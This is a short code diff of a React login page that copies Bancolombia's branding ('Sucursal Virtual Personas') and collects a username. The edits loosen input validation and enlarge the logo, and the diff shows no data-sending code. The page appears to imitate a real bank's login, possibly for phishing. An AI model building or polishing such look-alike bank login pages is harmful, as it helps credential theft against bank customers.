@@ -25,11 +25,7 @@ export default function Component() {
     }, 1000)
     return () => clearInterval(timer)
   }, [])
-
-  const handleChange = (e) => {
-    const value = e.target.value.replace(/[^0-9]/g, '');
-    setUsername(value);
-  };
+  
 
   const handleSubmit = (event) => {
     event.preventDefault();
@@ -50,7 +46,7 @@ export default function Component() {
             alt="Bancolombia Logo"
             width={170}
             height={27}
-            className="h-[27px] w-auto"
+            className="h-[50px] w-auto"
           />
           <p className="text-[1.08rem] text-muted-foreground mt-1">Sucursal Virtual Personas</p>
           <p className="text-xs text-muted-foreground mt-1">Fecha y hora actual: {currentDateTime}</p>
@@ -84,7 +80,7 @@ export default function Component() {
                           name="username"
                           type="number"
                           value={username}
-                          onChange={handleChange}
+                          onChange={(e) => setUsername(e.target.value)}
                           required
                           className="pl-8 rounded-none"
                           placeholder=""
